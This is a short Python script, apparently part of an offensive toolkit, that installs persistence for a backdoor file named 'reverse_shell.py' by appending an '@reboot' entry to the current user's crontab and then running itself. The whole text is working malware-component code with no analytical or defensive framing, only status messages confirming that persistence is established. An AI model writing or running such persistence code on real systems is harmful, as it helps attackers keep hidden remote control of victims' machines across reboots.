import os
import subprocess

def persistence():
	backdoor_path = os.path.realpath("reverse_shell.py")
	
	#vérifie si déjà dans le crontab
	current = subprocess.getoutput("crontab -l 2>/dev/null")
	entry = f"@reboot python3 {backdoor_path}"
	
	if entry not in current:
		os.system(f'(crontab -l 2>/dev/null; echo "@reboot python3 {backdoor_path}") | crontab -')
		print("[+] Persistence established via cron")
	
	else:
		print("[+] Already persistent")

persistence()
